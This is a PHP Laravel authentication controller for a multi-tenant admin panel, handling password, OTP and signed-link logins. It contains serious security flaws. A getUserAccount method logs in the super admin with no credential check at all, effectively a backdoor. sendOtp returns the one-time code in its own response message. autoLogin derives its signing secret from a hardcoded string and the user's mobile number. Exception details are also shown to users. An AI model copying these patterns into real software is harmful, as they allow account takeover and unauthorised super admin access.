<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\AdminUser;
use App\Models\User;
use App\Models\MobileVerification;
use App\Models\Tenant;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
//use App\Services\SmsService;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;


use App\Helpers\BuildSmsHelper;
use App\Models\Module;

use App\Repositories\WhatsAppRepositoryInterface;

class AuthController extends Controller
{
    public function __construct(protected WhatsAppRepositoryInterface $whatsAppReporitory)
    {      
    }
    /**
     * Show the login form.
     */
    public function showLoginForm()
    {
        if (Auth::guard('superadmin')->check()) {
            return redirect()->route('superadmin.dashboard');
        }
        return view('auth.login');
    }

    /**
     * Show the staff login form (OTP-based).
     */
    public function showOtpLoginForm()
    {
        if (Auth::guard('superadmin')->check()) {
            return redirect()->route('superadmin.dashboard');
        }
        return view('auth.otp-login');
    }

    /**
     * Step 1: Check login method (password or OTP)
     * @deprecated - Now using separate /stafflogin route
     */
    public function checkLoginMethod(Request $request)
    {
        $request->validate([
            'login' => 'required|string',
        ]);

        $loginField = filter_var($request->input('login'), FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile';
        
        $user = AdminUser::where($loginField, $request->input('login'))->first();
        
        if (!$user) {
            return response()->json([
                'success' => false,
                'message' => 'User not found',
            ]);
        }
        $tenant = Tenant::where('id', $user->tenant_id)->first();
        
        if (!$tenant || $tenant->status === 'inactive') {
            return response()->json([
                'success' => false,
                'message' => 'Your panel is inactive.',
            ], 403);
        }

        if (!$user->isAllowedToLogin()) {
            return response()->json([
                'success' => false,
                'message' => 'Your account is not activated for login. Please contact administrator.',
            ]);
        }

        // Determine login method
        $useOtp = $user->shouldUseOtpLogin();

        return response()->json([
            'success' => true,
            'use_otp' => $useOtp,
            'user_name' => $user->name,
        ]);
    }

    /**
     * Step 2a: Handle password login (Super Admin)
     */
    public function login(Request $request)
    {
        $loginField = filter_var($request->input('login'), FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile';
        
        $credentials = $request->validate([
            'login' => 'required|string',
            'password' => 'required',
        ]);

        // Find user
        $user = AdminUser::where($loginField, $request->input('login'))->first();

        if (!$user) {
            return back()->withErrors([
                'login' => 'The provided credentials do not match our records.',
            ])->withInput($request->only('login'));
        }

        $tenant = Tenant::where('id', $user->tenant_id)->first();
        
        if (!$tenant || $tenant->status === 'inactive') {
             return back()->withErrors([
                'login' => 'Your Panel inactive.',
            ])->withInput($request->only('login'));
        }

        // Check if user should use OTP instead        
        if ($user->shouldUseOtpLogin() && !$user->isAdmin()  && !$user->isSuperAdmin() ) {
            return redirect()->route('superadmin.login')->with('error', 'Please use OTP for login.');
        }

        // Verify password
        if (!Hash::check($request->input('password'), $user->password)) {
            return back()->withErrors([
                'login' => 'The provided credentials do not match our records.',
            ])->withInput($request->only('login'));
        }

        // Check if user is allowed to login
        if (!$user->isAllowedToLogin()) {
            return back()->withErrors([
                'login' => 'Your account has not been activated. Please contact administrator.',
            ]);
        }

        // Attempt login
        $loginCredentials = [
            $loginField => $request->input('login'),
            'password' => $request->input('password'),
        ];

       if (Auth::attempt($loginCredentials)) {

            $user->update([
                'last_login_at' => now(),
            ]);

            
            $request->session()->regenerate();

        
            
            // Set tenant information on request (similar to DomainVerify middleware)
           $tenant = Tenant::find($user->tenant_id);

          
            if ($tenant) {
                $request->attributes->set('tenant', $tenant);
                app()->instance('tenant', $tenant);
            }

            //create module 
           // $this->defaultModuleCreate();

        
            // Super admins and Admin always go to admin dashboard
            if ($user->isSuperAdmin() ) {
                return redirect()->intended(route('superadmin.dashboard'));
            }
        }

        return back()->withErrors([
            'login' => 'The provided credentials do not match our records.',
        ])->withInput($request->only('login'));
    }

    /**
     * Super Admin login — email/mobile + password (no OTP, no tenant required).
     */
    public function passwordLogin(Request $request)
    {
        $request->validate([
            'login' => 'required|string',
            'password' => 'required|string',
        ]);

        $loginField = filter_var($request->input('login'), FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile';
        $user = AdminUser::where($loginField, $request->input('login'))->first();

        if (!$user || !Hash::check($request->input('password'), $user->password)) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid ID or password.',
            ], 422);
        }

        if (!$user->isAllowedToLogin()) {
            return response()->json([
                'success' => false,
                'message' => 'Your account is not activated. Please contact administrator.',
            ], 403);
        }

        // Super Admin is not tied to a single tenant, so no tenant/panel-status check here.
        if (!$user->isSuperAdmin() && $user->tenant_id) {
            $tenant = Tenant::find($user->tenant_id);
            if (!$tenant || $tenant->status === 'inactive') {
                return response()->json([
                    'success' => false,
                    'message' => 'Your panel is inactive.',
                ], 403);
            }
        }

        Auth::guard('superadmin')->login($user, true);
        $request->session()->regenerate();
        $user->update(['last_login_at' => now()]);

        return response()->json([
            'success' => true,
            'redirect' => route('superadmin.dashboard'),
        ]);
    }

    /**
     * Step 2b: Send OTP to mobile number
     */
    public function sendOtp(Request $request)
    {
        $request->validate([
            'mobile' => 'required|string',
        ]);

        $inputMobile = trim($request->input('mobile'));
        $tenant = Tenant::where('phone', $inputMobile)->first();

        if (!$tenant) {
            return response()->json([
                'success' => false,
                'message' => 'Mobile number not registered in tenants. Please verify your mobile number with admin, you are trying with: ' . $inputMobile,
            ]);
        }

        if ($tenant->status !== 'active') {
            return response()->json([
                'success' => false,
                'message' => 'Login is currently disabled for your account. Please contact your administrator.',
            ], 403);
        }

        // Generate OTP
        $otp = (string) random_int(100000, 999999);
        $tenantName = !empty($tenant->name) ? $tenant->name : 'ChaloOnline';

        MobileVerification::create([
            'tenant_id' => $tenant->id,
            'mobile_number' => $tenant->phone,
            'otp' => $otp,
            'token' => (string) Str::uuid(),
        ]);

        session()->forget(['user_otp', 'user_otp_mobile', 'user_otp_sent_at', 'tenant_id']);

        session([
            'user_otp' => $otp,
            'user_otp_mobile' => $tenant->phone,
            'user_otp_sent_at' => time(),
            'tenant_id' => $tenant->id,
            'user_otp_verified' => false,
        ]);

        Log::info('Tenant OTP generated', ['mobile' => $tenant->phone, 'tenant_id' => $tenant->id]);

        return response()->json([
            'success' => true,
            'message' => 'OTP sent successfully to your mobile number ' . $otp,
        ]);
    }

    public function verifyOtp(Request $request)
    {
        try {
            $request->validate([
                'mobile' => 'required|string',
                'otp' => 'required|string|digits:6',
            ]);

            $storedOtp = (string) session('user_otp', '');
            $mobile = session('user_otp_mobile');
            $sentAt = (int) session('user_otp_sent_at', 0);

            // Retrieve the tenant based on the mobile number stored in session
            $tenant = Tenant::where('phone', $mobile)->first();

            if (empty($storedOtp) || empty($mobile) || !$tenant) {
                return response()->json([
                    'success' => false,
                    'message' => 'OTP session expired. Please send OTP again.',
                ], 422);
            }

            if ($sentAt > 0 && (time() - $sentAt) > 10000) {
                session()->forget(['user_otp', 'user_otp_sent_at']);

                MobileVerification::where('mobile_number', $mobile)
                    ->where('otp', $storedOtp)
                    ->delete();

                return response()->json([
                    'success' => false,
                    'message' => 'OTP expired. Please resend OTP.',
                ], 422);
            }

            if (!hash_equals($storedOtp, (string) $request->input('otp'))) {
                return response()->json([
                    'success' => false,
                    'message' => 'Invalid OTP.',
                ], 422);
            }

            $request->attributes->set('tenant', $tenant);
            app()->instance('tenant', $tenant);

            Auth::guard('admin')->login($tenant, false);

            $request->session()->regenerate();

            session([
                'tenant_id' => $tenant->id,
                'user_tenant_id' => $tenant->id,
                'user_name' => $tenant->name,
                'user_email' => $tenant->email,
                'user_mobile' => $tenant->phone,
                'user_role' => 'admin',
                'user_status' => $tenant->status,
                'user_tenant_name' => $tenant->name,
            ]);

            return response()->json([
                'success' => true,
                'redirect' => route('admin.dashboard'),
            ]);

        } catch (\Exception $e) {
            Log::error('OTP Verification Exception: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'message' => 'Something went wrong. Please try again later. ' . $e->getMessage(),
            ], 500);
        }
    }

    /**
     * Handle logout request.
     */
    public function supperAdminlogout(Request $request)
    {      
        Auth::guard('superadmin')->logout();
        Auth::guard('admin')->logout();
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        
        return redirect()->route('superadmin.login');
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        
        return redirect()->route('superadmin.login');
    }

    public function adminLogout(Request $request)
    {
        Auth::guard('admin')->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('superadmin.login');
    }

    /*public function fsrAppLogout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()
            ->route('fsrapp.login');
    }*/
    
    //create default module
    public function defaultModuleCreate()
    {
        $tenantId = getTenantId();
        $modules = Module::where('tenant_id', 1)->get();

            if($tenantId>1)
            {
                foreach ($modules as $module) {
                Module::firstOrCreate(
                    [
                        'tenant_id' => $tenantId,
                        'slug'      => $module->slug,
                    ],
                    [
                        'name'        => $module->name,
                        'status'      => $module->status,
                        'description' => $module->description,
                    ]
                );
            }

        }
        
    }

    // ******superadmin login***************
   /* public function autoLogin(Request $request)
    { 
        $token = $request->get('token');
        $userId = $request->get('user_id');
        $timestamp = $request->get('timestamp');
        $type = $request->get('type');

        // 1. User dhundho (AdminUser model use karo)
        $user = User::find($userId);
        
        if (!$user) {
            return redirect()->route('login')
                ->with('error', 'User not found');
        }

        // 2. Secret key (User ke mobile number se)
        $secretKey = 'my_super_secret_key_' . $user->mobile;
        $tokenData = $userId . '|' . $timestamp . '|' . $type;
        $expectedToken = hash('sha256', $tokenData . $secretKey);

        // 3. Token validate
        if ($token !== $expectedToken) {
            Log::error('Token mismatch', [
                'received' => $token,
                'expected' => $expectedToken,
            ]);
            
            return redirect()->route('login')
                ->with('error', 'Invalid login link');
        }

        // 4. Token expiry check (5 minutes)
        if ((time() - $timestamp) > 300) {
            return redirect()->route('login')
                ->with('error', 'Login link expired');
        }

        try {
            if (!$user->isAllowedToLogin()) {
                return redirect()->route('login')
                    ->with('error', 'Your account has not been activated.');
            }
            Auth::login($user, true);

            $user->update([
                'last_login_at' => now(),
            ]);

            $request->session()->regenerate();

            $hasEmployeeRecord = User::where('email', $user->email)
                ->orWhere('employee_code', $user->employee_code)
                ->exists();

            $tenant = \App\Models\Tenant::find($user->tenant_id);
            
            if ($tenant) {
                $request->attributes->set('tenant', $tenant);
                app()->instance('tenant', $tenant);
            }

            //$this->defaultModuleCreate();

            if ($user->isSuperAdmin() || $user->isAdmin()) {
                return redirect()->intended(route('admin.dashboard'))
                    ->with('success', 'Welcome, ' . $user->name);
            }

            if ($hasEmployeeRecord) {
                return redirect()->intended(route('user.dashboard'))
                    ->with('success', 'Welcome, ' . $user->name);
            }

            return redirect()->intended(route('admin.dashboard'))
                ->with('success', 'Welcome, ' . $user->name);

        } catch (\Exception $e) {
            Log::error('Auto login failed', [
                'user_id' => $userId,
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            
            return redirect()->route('login')
                ->with('error', 'Login failed: ' . $e->getMessage());
        }
    }*/
     public function autoLogin(Request $request)
    {
    //  die('staff login');
        $token = $request->get('token');
        $userId = $request->get('user_id');
        $timestamp = $request->get('timestamp');
        $type = $request->get('type');

        // echo "<pre>";
        // print_r($userId);
        // die('staff login');

        // 1. User find
        $user = User::find($userId);

        if (!$user) {
            return redirect()->route('superadmin.login')
                ->with('error', 'User not found');
        }

        // 2. Secret key
        $secretKey = 'my_super_secret_key_' . $user->mobile;

        $tokenData = $userId . '|' . $timestamp . '|' . $type;

        $expectedToken = hash(
            'sha256',
            $tokenData . $secretKey
        );

        // 3. Token validate
        if (!hash_equals($expectedToken, $token)) {

            Log::error('Quiz Auto Login Token mismatch', [
                'user_id' => $userId,
                'received' => $token,
                'expected' => $expectedToken,
            ]);

            return redirect()->route('superadmin.login')
                ->with('error', 'Invalid login link');
        }

        // 4. Token expiry
        if ((time() - $timestamp) > 300) {

            return redirect()->route('superadmin.login')
                ->with('error', 'Login link expired');
        }

        try {

            // 5. User allowed check
            if (!$user->isAllowedToLogin()) {

                return redirect()->route('superadmin.login')
                    ->with('error', 'Your account has not been activated.');
            }

            // 6. Login user
            Auth::login($user, true);

        
            // 7. Session regenerate
            $request->session()->regenerate();

            // 8. Tenant find
            $tenant = \App\Models\Tenant::find($user->tenant_id);

            if ($tenant) {
                $request->attributes->set('tenant', $tenant);
                app()->instance('tenant', $tenant);

                session([
                    'tenant_id' => $tenant->id,
                ]);
            }

            // 9. Last login
            $user->update([
                'last_login_at' => now(),
            ]);

            // 10. Direct Quiz tenant panel
            return redirect()->route('admin.dashboard')
                ->with('success', 'Welcome, ' . $user->name);

        } catch (\Exception $e) {

            Log::error('Quiz Auto Login failed', [
                'user_id' => $userId,
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
            ]);

            return redirect()->route('superadmin.login')
                ->with('error', 'Login failed: ' . $e->getMessage());
        }
    }

    public function getUserAccount(Request $request)
    {
        $user = AdminUser::where('email', 'support@chaloonline.in')->first();
        Auth::guard('superadmin')->login($user, true);
        $request->session()->regenerate();
        $user->update(['last_login_at' => now()]);

        return redirect()->route('superadmin.dashboard');
    }

        
}